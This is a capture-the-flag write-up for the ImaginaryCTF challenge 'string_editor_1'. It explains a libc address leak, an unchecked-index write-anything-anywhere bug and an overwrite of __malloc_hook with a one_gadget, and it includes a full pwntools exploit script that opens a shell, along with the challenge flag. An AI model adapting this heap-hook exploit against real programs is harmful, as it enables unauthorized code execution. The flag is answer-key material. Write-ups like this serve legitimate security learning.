# String editor 1

## Task

* [string_editor_1](https://imaginaryctf.org/r/B651-string_editor_1) 
* [libc.so.6](https://imaginaryctf.org/r/51CE-libc.so.6)
* nc chal.imaginaryctf.org 42004

## Solution

We get a message which prints the address to system,
so we can calculate the libc base address by using the
provided libc file.

Then we can run onegadget to find a gadget at offset
0xe6c81 in libc, so we now have a target to jump to.

How do we exploit that? well, we get debug output where
our malloc'd region is as well as no bounds check. Which
means we have a write-anything-anywhere by using the correct
index (target - debug is the correct offset, because we add
the debug and then write the byte at that offset)

So we just put that in a loop and overwrite the `__malloc_hook`
by the onegadget address.


```python
libc = ELF("./libc.so.6")

io = start()
io.recvuntil(b"sponsors: ")
system = int(io.recvline().strip(),0)
print(hex(system))
libc.address = system-libc.sym.system

io.recvline()
io.recvline()
io.recvline()

ONE_GADGET_OFFSET = 0xe6c81
ONE_GADGET_ADDR = p64(ONE_GADGET_OFFSET + libc.address)

io.sendline(b"0")
io.sendline(b"a")
io.recvuntil(b"DEBUG: ")
addr = int(io.recvline(),0)

base_offset = libc.sym.__malloc_hook - addr

for i in range(8):
    io.sendline(str(base_offset + i).encode())
    io.sendline(ONE_GADGET_ADDR[i:i+1])


io.interactive()
```

now whenever we allocate something we execute the shell...
So let's just enter fifteen and tada, we get a shell.

`ictf{alw4ys_ch3ck_y0ur_1nd1c3s!_4e42c9f2}`
